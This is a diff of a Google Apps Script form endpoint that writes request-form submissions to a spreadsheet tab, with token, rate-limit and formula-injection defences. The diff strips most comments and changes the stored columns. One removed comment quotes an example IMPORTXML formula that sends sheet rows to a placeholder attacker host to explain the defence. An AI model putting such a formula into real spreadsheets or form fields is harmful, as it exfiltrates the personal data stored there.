@@ -1,49 +1,6 @@
-/* ======================================================================
-   Loja Privata - request form endpoint
-   ----------------------------------------------------------------------
-   A Google Apps Script web app: it receives one request from the form in
-   index.html and appends one row to the "primeA" tab of this spreadsheet.
-
-   Two routes, and nothing else is reachable from the internet:
-
-     GET  ?action=token   -> a single-use submit token
-     POST (JSON body)     -> validate, rate-limit, reject a repeat address,
-                             append one row
-
-   No public read route: the POST checks the Email column to reject an
-   address that has already applied, but it never returns what it found -
-   a caller learns yes/no for one address at a time, not the list itself.
-
-   Abuse controls: a single-use HMAC token (a submit must follow a real
-   GET) and one global rate limit (a ceiling on writes per rolling hour
-   for the whole endpoint, so one bad hour cannot burn the day's Apps
-   Script quota). No CAPTCHA, no per-visitor tracking.
-
-   This script is CONTAINER-BOUND: create it from the spreadsheet itself
-   (Extensions > Apps Script). That is what keeps the only OAuth scope it
-   ever needs down to `spreadsheets.currentonly` - it can touch this one
-   spreadsheet and nothing else in the account's Drive. There is
-   deliberately no sheet id in the config and no `openById()` anywhere.
-
-   Deploy: Deploy > New deployment > Web app,
-           "Execute as: Me", "Who has access: Anyone".
-   Both are required for a public form. "Execute as: Me" is what lets an
-   anonymous visitor write to a sheet only you can open - the visitor
-   never touches your Drive, this script does, on their behalf, through
-   exactly the two routes below.
-
-   Ground rule throughout: the browser is not a security boundary. Every
-   check the page performs is repeated here, on values re-derived from the
-   raw request body. Nothing from the client is trusted, including its
-   Content-Type, its timestamps and its idea of what a field means.
-
-   Setup, deployment and the reasoning behind each defence: README.md
-   ====================================================================== */
 
 
-/* ======================================================================
-   1. LIMITS AND KEYS
-   ====================================================================== */
+
 
 var LIMITS = {
   bodyChars:      4096,   // a legitimate submit is ~250 characters
@@ -54,10 +11,7 @@ var LIMITS = {
   tokenMaxAgeMs:  30 * 60 * 1000
 };
 
-/* ----------------------------------------------------------------------
-   Signing key. Generated once, on demand, and kept in Script Properties —
-   never in this file, so the code can be shared or committed safely.
-   ---------------------------------------------------------------------- */
+
 function getSigningKey_() {
   var props = PropertiesService.getScriptProperties();
   var key = props.getProperty('SIGNING_KEY');
@@ -85,27 +39,7 @@ function safeEquals_(a, b) {
   return diff === 0;
 }
 
-/* ======================================================================
-   2. TOKENS AND THE RATE LIMIT
-   ====================================================================== */
 
-/* ----------------------------------------------------------------------
-   Single-use submit tokens.
-
-   Apps Script cannot read request headers, so an Origin or Referer check
-   is not available and a classic CSRF token has nothing to bind to. What
-   this does buy:
-
-     - a submit must be preceded by a GET from a real page load
-     - each token dies on first use (CacheService), so a captured request
-       cannot be replayed
-     - the min/max age window rejects both instant-fire bots and stale
-       tokens scraped hours earlier
-
-   It is a speed bump for automation, not authentication. The endpoint is
-   public by design: treat every row in the sheet as unverified until a
-   human confirms it.
-   ---------------------------------------------------------------------- */
 function issueToken() {
   var payload = Date.now() + '.' + Utilities.getUuid();
   return payload + '.' + hmac_(payload);
@@ -134,23 +68,7 @@ function consumeToken_(token) {
   return true;
 }
 
-/* ----------------------------------------------------------------------
-   Rate limit. Apps Script exposes no client IP, so this is ONE ceiling
-   for the whole endpoint, not a per-visitor limit: at most RATE_MAX
-   submits in any rolling RATE_WINDOW_MS. Real traffic (~1000/day, well
-   under 300 in any single hour for this form) never reaches it; a flood
-   hits the ceiling and gets 'busy' until the window rolls forward, which
-   stops one bad hour from spending the day's execution quota.
 
-   The window is measured from real timestamps, not a fixed clock bucket:
-   the cache holds the epoch-ms of recent submits and each call drops the
-   ones that have aged past the window before counting. Nothing to reset,
-   nothing to time a burst against.
-
-   The read-then-write is not atomic, so a simultaneous burst can slip a
-   few past RATE_MAX. That is fine - this is a safety ceiling, not an
-   exact quota.
-   ---------------------------------------------------------------------- */
 var RATE_MAX = 300;
 var RATE_WINDOW_MS = 60 * 60 * 1000;   // one hour
 
@@ -172,19 +90,7 @@ function rateLimitOk_() {
   return true;
 }
 
-/* ======================================================================
-   3. INPUT VALIDATION
-   ====================================================================== */
 
-/* ----------------------------------------------------------------------
-   Normalisation + validation
-   ---------------------------------------------------------------------- */
-
-/* Strips the characters that make a value dangerous or unreadable rather
-   than merely wrong: C0/C1 controls, bidi overrides (used to make a name
-   render as something other than what is stored), zero-width marks, and
-   runs of whitespace. NFC first, so visually identical strings compare
-   and de-duplicate as equal. */
 function clean_(value) {
   if (typeof value !== 'string') return '';
   return value
@@ -233,8 +139,8 @@ function validateSubmission_(body) {
   if (clean_(body.company) !== '') return { ok: false, error: 'honeypot' };
 
   var fullName  = validateName_(body.fullName);
-  var email     = validateEmail_(body.email);
   var signature = validateName_(body.signature);
+  var email     = validateEmail_(body.email);
 
   if (!fullName)  return { ok: false, error: 'invalid_name' };
   if (!email)     return { ok: false, error: 'invalid_email' };
@@ -243,31 +149,20 @@ function validateSubmission_(body) {
   var now = new Date();
   var tz  = Session.getScriptTimeZone();
 
-  /* The signature is the visitor's consent gesture: it must be present and
-     name-shaped, so it is validated. It is NOT stored - it only ever
-     repeats the full name, so the sheet would carry the same value twice.
-     The four columns are Received At, Full Name, Email, Status. */
   return {
     ok: true,
     record: {
       receivedAt: Utilities.formatDate(now, tz, "yyyy-MM-dd'T'HH:mm:ssXXX"),
       fullName:   fullName,
+      signature:  signature,
       email:      email
     }
   };
 }
 
-/* ======================================================================
-   4. THE SHEET
-   ====================================================================== */
 
-/* The tab the requests land in. Looked up by name, not by position, so
-   dragging the tabs around in the UI can never silently redirect
-   submissions into the wrong sheet. Created as the first tab if it is not
-   there yet, so a brand-new spreadsheet works with no manual setup.
 
-   Rename it here and in the spreadsheet together, or the next submit will
-   quietly start a fresh, empty tab under the old name. */
+
 var SHEET_NAME = 'primeA';
 
 function getInboxSheet_() {
@@ -278,29 +173,16 @@ function getInboxSheet_() {
 var COLUMNS = [
   'Received At',    // server clock, ISO 8601 — never trust a client timestamp
   'Full Name',
-  'Email',
-  'Status'          // workflow column for whoever reviews the requests
+  'Signature',
+  'Email'
 ];
 
-/* ----------------------------------------------------------------------
-   Duplicate guard. One person applies once; a second submit from the same
-   address is rejected rather than silently absorbed.
 
-   Reads the Email column (3) and scans it in memory. This is not a public
-   read route - doPost never returns what it finds, only a yes/no - so the
-   membership list still cannot be pulled back out. It does make the form
-   an address-checking oracle (type an email, learn if it applied); the
-   token gate and the hourly cap are what keep that probing slow.
-
-   Stored values carry Sheets' leading-apostrophe literal marker, which
-   getValues() strips on read; the defensive replace covers any row that
-   predates asLiteralText_. `email` is already normalised lowercase.
-   ---------------------------------------------------------------------- */
 function emailExists_(sheet, email) {
   var last = sheet.getLastRow();
   if (last < 2) return false;   // header only, or empty
 
-  var column = sheet.getRange(2, 3, last - 1, 1).getValues();
+  var column = sheet.getRange(2, 4, last - 1, 1).getValues();   // column 4 = Email
   for (var i = 0; i < column.length; i++) {
     var cell = String(column[i][0]).replace(/^'/, '').trim().toLowerCase();
     if (cell === email) return true;
@@ -308,7 +190,7 @@ function emailExists_(sheet, email) {
   return false;
 }
 
-/* Idempotent: safe to call on every submit, cheap after the first run. */
+
 function ensureHeader_(sheet) {
   if (sheet.getLastRow() > 0) return;
 
@@ -320,41 +202,17 @@ function ensureHeader_(sheet) {
   // Widen the columns people actually read.
   sheet.setColumnWidth(1, 170);   // Received At
   sheet.setColumnWidth(2, 200);   // Full Name
-  sheet.setColumnWidth(3, 240);   // Email
-  sheet.setColumnWidth(4, 90);    // Status
+  sheet.setColumnWidth(3, 200);   // Signature
+  sheet.setColumnWidth(4, 240);   // Email
 }
 
-/* ----------------------------------------------------------------------
-   Formula / CSV injection defence.
 
-   A cell whose value starts with = + - @ (or a tab/CR, which some clients
-   normalise into those) is executed as a formula by Sheets and by Excel
-   when the sheet is exported to CSV. A field like
-
-       =IMPORTXML("https://attacker.example/?d="&A2, "//x")
-
-   would quietly exfiltrate every row of this sheet to whoever typed it.
-
-   A single leading apostrophe is Sheets' own "this is literal text"
-   marker: it is stored, not displayed, and getValue() gives back the
-   original string. So every user-supplied cell gets one. Nothing here
-   is ever evaluated.
-   ---------------------------------------------------------------------- */
 function asLiteralText_(value) {
   var s = String(value == null ? '' : value);
   return "'" + s;
 }
 
-/* Appends one submission. Caller has already validated and normalised
-   `record`; this function only serialises it. Returns true when a row was
-   written, false when the address had already applied.
 
-   The duplicate check and the append share one lock, so two concurrent
-   submits of the same new address cannot both get through.
-
-   getLastRow()+1 under a script lock rather than appendRow() — appendRow
-   re-parses its arguments as if they were typed into the cell, which is
-   exactly the parsing we are trying to avoid. */
 function writeRow(record) {
   var lock = LockService.getScriptLock();
   // Concurrent submits would otherwise race for the same row index.
@@ -369,8 +227,8 @@ function writeRow(record) {
     var row = [
       asLiteralText_(record.receivedAt),
       asLiteralText_(record.fullName),
-      asLiteralText_(record.email),
-      asLiteralText_('Nou')
+      asLiteralText_(record.signature),
+      asLiteralText_(record.email)
     ];
 
     sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length).setValues([row]);
@@ -381,13 +239,8 @@ function writeRow(record) {
   }
 }
 
-/* ======================================================================
-   5. WEB APP ENTRY POINTS
-   ====================================================================== */
 
-/* Responses are deliberately terse and identical in shape. They carry a
-   short machine code, never a message built from user input, never a
-   stack trace, and never a hint about what the server holds. */
+
 function respond_(payload) {
   return ContentService
     .createTextOutput(JSON.stringify(payload))
@@ -461,11 +314,7 @@ function doPost(e) {
   }
 }
 
-/* ----------------------------------------------------------------------
-   Run once from the editor, before the first deployment: it creates the
-   signing key and the header row, and makes the OAuth consent prompt
-   happen here rather than on a visitor's first submit.
-   ---------------------------------------------------------------------- */
+
 function setup() {
   var sheet = getInboxSheet_();
   getSigningKey_();
@@ -496,6 +345,7 @@ function selfTest() {
   var written = writeRow({
     receivedAt: new Date().toISOString(),
     fullName:   'Test Ionescu',
+    signature:  'Test Ionescu',
     email:      'test+' + Date.now() + '@example.com'
   });
 
